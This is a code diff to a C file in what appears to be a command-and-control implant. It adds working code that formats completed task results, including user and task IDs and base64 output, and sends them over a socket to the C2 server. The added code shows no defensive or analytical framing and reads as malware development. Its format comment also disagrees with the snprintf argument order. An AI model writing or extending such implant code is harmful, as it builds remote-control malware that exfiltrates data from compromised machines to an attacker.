@@ -4,11 +4,13 @@
 
 #include "choice.h"
 #include "tasks.h"
+#include "connexion.h"
 
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <stddef.h>  // For NULL
+#include <unistd.h>  // For close
 
 void choice(char * buffer_fetch, char * user_ID) {
     char buffer[1024];
@@ -75,16 +77,34 @@ void choice(char * buffer_fetch, char * user_ID) {
     }
 
     // Here you would send the results back to the C2 server
-    // Format: user_ID, task_ID, task_result (base64)
+    // Format: RESULT,task_ID,user_ID,task_result (base64)
     if (task_ID != NULL) {
         printf("Task completed - User ID: %s, Task ID: %s\n", user_ID, task_ID);
 
-        // Send back the result to the C2 server with format: user_ID,task_ID,result_base64
-        // Example of code you might add here:
-        // char response[1024 * 1024 + 256];
-        // snprintf(response, sizeof(response), "%s,%s,%s", user_ID, task_ID, task_result);
-        // send_to_server(response);
+        // Create a response message for the C2 server
+        char *response = malloc(1024 * 1024 + 512); // Allocate large buffer for response
+        if (response == NULL) {
+            perror("Memory allocation failed for response");
+            free(task_ID);
+            free(task_result);
+            return;
+        }
 
+        // Format the response: RESULT,task_ID,user_ID,task_result
+        snprintf(response, 1024 * 1024 + 512, "RESULT,%s,%s,%s\n", user_ID, task_ID, task_result);
+
+        // Open a new socket connection to the C2 server
+        int sock_result = sock_init();
+        if (sock_result != -1) {
+            char buffer_response[1024] = {0};
+            send_message(sock_result, response, buffer_response);
+            printf("Result sent to server, response: %s\n", buffer_response);
+            close(sock_result);
+        } else {
+            printf("Failed to send result to server\n");
+        }
+
+        free(response);
         free(task_ID); // Free the task_ID allocated by the task function
     }
 
